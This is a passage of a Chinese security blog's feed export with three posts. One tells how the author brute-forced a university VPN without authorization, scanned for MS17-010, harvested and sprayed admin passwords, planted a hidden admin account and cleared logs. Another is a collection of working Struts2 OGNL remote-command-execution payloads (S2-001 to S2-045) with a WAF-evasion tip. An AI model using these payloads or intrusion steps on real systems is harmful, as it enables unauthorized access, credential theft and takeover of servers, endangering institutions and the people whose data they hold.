verbose_ping("www.aasdasdasdasdad.com",2,1)</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>先这样发了….跑死和性能不知道怎么再优化..有大佬指点下吗？之后再来进行修改吧。哪天抽空弄个评论区，有大佬指点的话联系qq2874385505，不胜感激。</p>
]]></content>
      
        <categories>
            
            <category> 杂项 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VPN的安全问题]]></title>
      <url>http://www.warmeng.com/2017/12/13/vpn_university/</url>
      <content type="html"><![CDATA[<p>  tips：clearev！！<br><a id="more"></a></p>
<h1 id="step1-引子"><a href="#step1-引子" class="headerlink" title="step1.引子"></a>step1.引子</h1><p>6月，是毕业的季节，当时公司的生活和学校的毕业让我不间断的切换自己的身份。正在公司里面干着渗透活的时候，朋友突然给我发了信息。问我他挂了很多门课，能不能黑掉教务网帮他改掉成绩。em…我自己大学物理和体育都挂了四年，都从来没有想过改成绩这种艺高人胆大的招式。我答应了！很兴奋！因为我看到了一个大大的越权！修改管理员的密码！管理员能做什么？！改成绩，交学费！改完成绩，我通知了我的朋友。但是我开始害怕，因为这是作弊，良心上也有愧疚。和朋友协商后，最终把成绩又改了回来。当时这个漏洞我并没有记录下来，当我想重新记录的时候已经是十九大的召开了，得知，学校把教务网弄成内网访问。后来我便放弃了。谁知道偶然间，故事就开始了</p>
<h1 id="step2-VPN"><a href="#step2-VPN" class="headerlink" title="step2.VPN"></a>step2.VPN</h1><p>做渗透的生活就是，有活干活，没活网上乱逛。我偶然间看到了北京大学的VPN，突然想到朋友的大学会不会也有VPN？VPN是否有机会让我爆破出账号？连接VPN我是不是能访问那个关进小黑屋的教务网？百度，intitile，inurl，最终我看到了这些东西。<br><img src="/images/20171212/1.png" alt=""><br><img src="/images/20171212/2.png" alt=""><br>直接告诉了我如何去爆破，笑出声！成功获得几枚vpn账号。<br><img src="/images/20171212/3.png" alt=""><br>成功登录，接下来就是配置mac下的easyconnect。<br><img src="/images/20171212/4.png" alt=""><br><img src="/images/20171212/5.png" alt=""></p>
<h1 id="step2-纵向越权"><a href="#step2-纵向越权" class="headerlink" title="step2.纵向越权"></a>step2.纵向越权</h1><p>连接VPN后，我果然可以访问教务网了。先登录（统一都是默认口令，所以只需要知道学号就ok）。来到修改密码处我傻眼了，当初的越权可能已经修复！当初修改密码是不用填写原密码的。<br><img src="/images/20171212/6.png" alt=""><br>可是我还是不甘心，抓包看看先。发现确实是多了参数导致我不能越权了。见下图：<br><img src="/images/20171212/7.png" alt=""></p>
<h1 id="step3-内网"><a href="#step3-内网" class="headerlink" title="step3.内网"></a>step3.内网</h1><p>既然连接了vpn，进入了内网，怎么可能空手而归？打开win7虚拟机，先看路由信息然后在扫永恒之蓝吧！<br><img src="/images/20171212/9.png" alt=""><br>看到这里其实我心情还是复杂的，窃喜？开心？不，实在是鄙夷这些学校的安全意识，这样其实遭殃的是学生！<br><img src="/images/20171212/10.png" alt=""><br><img src="/images/20171212/11.png" alt=""><br><img src="/images/20171212/12.png" alt=""><br><img src="/images/20171212/13.png" alt=""><br>很奇怪，提示有ms17010的服务器很多，但是成功的确没有几台，用NSA工具包也是这样，猜想可能有360？收集一下服务器admin的密码，然后清理痕迹。<br><img src="/images/20171212/14.png" alt=""></p>
<h1 id="setp4-抽奖1"><a href="#setp4-抽奖1" class="headerlink" title="setp4.抽奖1"></a>setp4.抽奖1</h1><p>ip生成字典，账号=admnistrator，密码=收集到的密码，扔进kali九头蛇，抽奖！<br><img src="/images/20171212/15.png" alt=""><br><img src="/images/20171212/16.png" alt=""><br>这里是抽到了一些奖品的，我就不全部贴图了，登录一台发现是在工作状态中的，但是现在时间是12:06，工作人员很有可能是去吃午饭去了！而且发现我之前的猜想没有错，之前永恒之蓝没有成功的确实是有360.（有没有大佬有绕的方法？）赶紧cmd添加一个管理员账号并且隐藏起来（tips：用户名前面加一个符号$）。</p>
<h1 id="setp5-抽奖2"><a href="#setp5-抽奖2" class="headerlink" title="setp5.抽奖2"></a>setp5.抽奖2</h1><p>业务系统一台一台的翻服务器太麻烦了，写了个脚本想要找出对应的web端口，如果能找到内网的教务网那就更好了，脚本如下，适当修改端口和后缀抽奖吧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#coding:utf-8</div><div class="line">import requests</div><div class="line"></div><div class="line">a=&apos;http://&apos;</div><div class="line">c=&apos;:8084/index.action&apos;</div><div class="line">header=&#123;&#125;</div><div class="line">header[&quot;User-Agent&quot;] = &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0&quot;</div><div class="line">f = open(&quot;/Users/nevermore/Desktop/ip.txt&quot;,&quot;r&quot;)</div><div class="line">lines = f.readlines()</div><div class="line">for line in lines:</div><div class="line">    line = line.strip()</div><div class="line">    result = a + line + c</div><div class="line">    #print result</div><div class="line">    try:</div><div class="line">        answer = requests.get(result,headers=header,timeout=3).status_code</div><div class="line">        if answer==200:</div><div class="line">            print result+&apos;sucess!!!!!!&apos;</div><div class="line">        else:</div><div class="line">            print answer+&apos;!!!&apos;+result</div><div class="line"></div><div class="line">    except Exception as e:</div><div class="line">        print &apos;error&apos;</div></pre></td></tr></table></figure></p>
<p><img src="/images/20171212/17.png" alt=""><br><img src="/images/20171212/18.png" alt=""><br>运气不算太好，并没有什么有用的web出现，有没有大佬知道这个是干嘛用的吗？？？<br>但是重新登录之前的的服务器，发现了这样的界面。<br><img src="/images/20171212/19.png" alt=""><br>控制台看一波已经存储的密码，收录进字典。<br><img src="/images/20171212/20.png" alt=""><br>所以。。这竟然是管理校园网的嘛？询问了朋友，果然也能找到朋友的账号！<br><img src="/images/20171212/21.png" alt=""></p>
<h1 id="step6-结束-amp-总结"><a href="#step6-结束-amp-总结" class="headerlink" title="step6.结束&amp;总结"></a>step6.结束&amp;总结</h1><p>其实我并不想早早结束，但是在一台服务器上面，我已经被管理员发现了，有点害怕，之前能改成绩和交学费，现在变成只能改网费。有点不甘心，但是却也不敢继续了。唉，VPN这里有好大的风险。本菜狗都能遨游鱼塘，那在校学生的信息恐怕早已在他人之手了。本文亮点没有，大佬轻喷，以后也要多学点硬件设备的知识，感觉内网这里思路还是太僵化了，要是有大牛带带就好了! (T_T)… </p>
]]></content>
      
        <categories>
            
            <category> 实战 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 实战过程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[struct2-xxx POC合集]]></title>
      <url>http://www.warmeng.com/2017/10/30/struct2/</url>
      <content type="html"><![CDATA[<p>  感觉有的时候工具不如直接提交poc。</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>  找到黑人的博客里面看到他曾经整理过poc集合，征求同意之后我就引用啦！传送门:<a href="http://blog.0kami.cn/2017/01/13/Struts2-history-payload/" target="_blank" rel="external">黑人大佬</a></p>
<h2 id="Struts2-S2-001"><a href="#Struts2-S2-001" class="headerlink" title="Struts2 S2-001"></a>Struts2 S2-001</h2><p>影响版本：2.0.0 - 2.0.8<br>漏洞详情：<a href="https://struts.apache.org/docs/s2-001.html" target="_blank" rel="external">https://struts.apache.org/docs/s2-001.html</a></p>
<p><strong>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</strong></p>
<p>上文引用<img src="http://rickgray.me/" alt="rickgray"></p>
<h2 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取tomcat执行路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</div></pre></td></tr></table></figure>
<p>获取web根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</div></pre></td></tr></table></figure>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</div></pre></td></tr></table></figure>
<h2 id="Struts-S2-005"><a href="#Struts-S2-005" class="headerlink" title="Struts S2-005"></a>Struts S2-005</h2><p>影响版本：2.0.0 - 2.1.8.1<br>漏洞详情：<a href="http://struts.apache.org/docs/s2-005.html" target="_blank" rel="external">http://struts.apache.org/docs/s2-005.html</a></p>
<p><strong>struts2漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为ongl语句执行(可理解为java代码)。ongl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式讲这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</strong></p>
<p>上文引用<img src="http://www.cnblogs.com/LittleHann/p/4606891.html" alt="LittleHann"></p>
<h2 id="构造poc-1"><a href="#构造poc-1" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43req\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\43xman\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))&apos;)(d))&amp;(i99)((&apos;\43xman.getWriter().close()&apos;)(d))</div></pre></td></tr></table></figure>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;&quot;+cmd+&quot;\&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</div></pre></td></tr></table></figure>
<p>上述poc引用自k8team </p>
<h2 id="Struts2-S2-009"><a href="#Struts2-S2-009" class="headerlink" title="Struts2 S2-009"></a>Struts2 S2-009</h2><p>影响版本：2.0.0 - 2.3.1.1<br>漏洞详情：<a href="https://struts.apache.org/docs/s2-009.html" target="_blank" rel="external">https://struts.apache.org/docs/s2-009.html</a></p>
<p><strong>漏洞利用点跟S2-003和S2-005类似，利用OGNL表达式(1)(2),会执行1的OGNL表达式，009构造了的方法为test=(some OGNL 表达式)(1)&amp;z[(test)(1)]=true。<br>z[(test)(1)]=true,对struts2来说是合法的参数，但是(test)(1)会执行上述说的方法，test的值被带入计算，造成命令执行。</strong></p>
<h2 id="构造poc-2"><a href="#构造poc-2" class="headerlink" title="构造poc"></a>构造poc</h2><p>弹计算器</p>
<p>ps:实验环境试了好几次都不能执行系统命令，路过的大佬求指教。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true</div></pre></td></tr></table></figure>
<p>获取web根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot;</div></pre></td></tr></table></figure>
<h2 id="Struts2-S2-012"><a href="#Struts2-S2-012" class="headerlink" title="Struts2 S2-012"></a>Struts2 S2-012</h2><p>影响版本：2.0.0 - 2.3.13<br>漏洞详情：<a href="https://cwiki.apache.org/confluence/display/WW/S2-012" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-012</a></p>
<p><strong>Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量,struts在获取其值时会执行OGNL表达式，从而造成命令执行</strong></p>
<h2 id="构造poc-3"><a href="#构造poc-3" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D</div></pre></td></tr></table></figure>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A</div></pre></td></tr></table></figure>
<h2 id="Struts2-S2-013-S2-014"><a href="#Struts2-S2-013-S2-014" class="headerlink" title="Struts2 S2-013/S2-014"></a>Struts2 S2-013/S2-014</h2><p>影响版本：2.0.0 - 2.3.14.1<br>漏洞详情：<a href="https://cwiki.apache.org/confluence/display/WW/S2-01" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-01</a></p>
<p><strong>标签s:url和s:a中提供include参数，其参数值可以为</strong></p>
<pre><code>1.none - include no parameters in the URL (default)
2.get - include only GET parameters in the URL
3.all - include both GET and POST parameters in the URL
</code></pre><p>如果参数值为get或all，在获取对应的参数值时执行了OGNL表达式</p>
<h2 id="构造poc-4"><a href="#构造poc-4" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125;</div></pre></td></tr></table></figure>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125;</div></pre></td></tr></table></figure>
<h2 id="Struts2-S2-016"><a href="#Struts2-S2-016" class="headerlink" title="Struts2 S2-016"></a>Struts2 S2-016</h2><p>影响版本：2.0.0 - 2.3.15<br>漏洞详情：<a href="https://struts.apache.org/docs/s2-016.html" target="_blank" rel="external">https://struts.apache.org/docs/s2-016.html</a></p>
<p><strong>DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction: 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行</strong></p>
<p>上文引用<img src="http://rickgray.me/" alt="rickgray"></p>
<p>构造poc</p>
<p>获取web根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125;</div></pre></td></tr></table></figure>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos;</div></pre></td></tr></table></figure>
<p>还有一种比较隐蔽的方法，将PoC放在文件上传的name处，过waf。</p>
<h2 id="Struts2-S2-019"><a href="#Struts2-S2-019" class="headerlink" title="Struts2 S2-019"></a>Struts2 S2-019</h2><p>影响版本：2.0.0 - 2.3.15.1<br>漏洞详情：<a href="https://cwiki.apache.org/confluence/display/WW/S2-01" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-01</a></p>
<p><strong>该漏洞成因为开启了开发者模式，传入debug=command&amp;expression=导致执行OGNL表达式，从而造成命令执行漏洞。</strong></p>
<h2 id="构造poc-5"><a href="#构造poc-5" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29</div></pre></td></tr></table></figure>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</div></pre></td></tr></table></figure>
<h2 id="Struts2-S2-032"><a href="#Struts2-S2-032" class="headerlink" title="Struts2 S2-032"></a>Struts2 S2-032</h2><p>影响版本：2.3.20 - 2.3.28 （except 2.3.20.3 and 2.3.24.3）<br>漏洞详情：<a href="https://struts.apache.org/docs/s2-032.html" target="_blank" rel="external">https://struts.apache.org/docs/s2-032.html</a></p>
<p><strong>在配置了 Struts2 DMI 为 True 的情况下，可以使用 method: Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》</strong></p>
<p>上文引用<img src="http://rickgray.me/" alt="rickgray"></p>
<h2 id="构造poc-6"><a href="#构造poc-6" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</div></pre></td></tr></table></figure>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</div></pre></td></tr></table></figure>
<h2 id="Struts2-S2-037"><a href="#Struts2-S2-037" class="headerlink" title="Struts2 S2-037"></a>Struts2 S2-037</h2><p>影响版本：2.3.20 - 2.3.28.1<br>漏洞详情：<a href="http://struts.apache.org/docs/s2-037.html" target="_blank" rel="external">http://struts.apache.org/docs/s2-037.html</a></p>
<p><strong>这个漏洞和之前S2-032/033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。</strong></p>
<p>上文引用<img src="http://blog.nsfocus.net/" alt="nsfocus"></p>
<h2 id="构造poc-7"><a href="#构造poc-7" class="headerlink" title="构造poc"></a>构造poc</h2><p>获取web根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</div></pre></td></tr></table></figure>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</div></pre></td></tr></table></figure>
<h2 id="Struts2-S2-045"><a href="#Struts2-S2-045" class="headerlink" title="Struts2 S2-045"></a>Struts2 S2-045</h2><p>影响版本：2.3.5 - 2.3.31 ／ 2.5 - 2.5.10<br>漏洞详情：<a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-045</a></p>
<h2 id="构造poc-8"><a href="#构造poc-8" class="headerlink" title="构造poc"></a>构造poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Type:%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;&quot; + cmd + &quot;&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 攻略 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 攻略 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
